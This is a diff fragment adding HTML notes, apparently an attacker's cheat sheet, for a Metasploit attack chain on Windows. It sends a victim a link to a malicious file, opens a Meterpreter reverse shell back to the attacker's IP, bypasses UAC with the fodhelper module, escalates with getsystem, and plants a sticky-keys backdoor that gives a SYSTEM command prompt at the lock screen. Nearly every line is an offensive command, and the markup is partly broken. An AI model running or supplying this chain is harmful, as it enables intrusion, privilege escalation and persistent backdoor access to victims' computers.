@@ -25,3 +25,29 @@
 <ul>set LPORT 444</ul>
   <ul>run/ul>
 </ol></p>
+    <h2>Attack</h2>
+<p>Send a link to the victim in order to open the malicious file</p>
+<h2>Meterpreter shell</h2>
+<p><ol><ul>sysinfo</ul>
+<ul>getuid</ul>
+<ul>background</ul></ol></p>
+<h2>Bypass UAC</h2>
+<p><ol>
+<ul>search bypassuac </ul>
+<ul>use exploit/windows/local/bypassuac_fodhelper</ul>
+<ul>set session 1</ul>
+<ul>show options</ul>
+<ul>set LHOST [MY IP ADDRESS]</ul>
+<ul>set TARGET 0</ul>
+<ul>getsystem -t 1</ul>
+<ul>getuid</ul>
+<ul>background</ul>
+<ul>use post/windows/manage/sticky_keys</ul>
+<ul>sessions i*</ul>
+<ul>set session 2</ul>
+<ul>exploit</ul></ol?</p>
+<h2>Activate Sticky Keys</h2>
+<p><ol>
+<ul>On the logged-out Windows machine, press 5x SHIFT </ul>
+<ul>this will open a command prompt on the lock screen with System privileges instead of sticky keys error window</ul>
+<ul>whoami</ul>
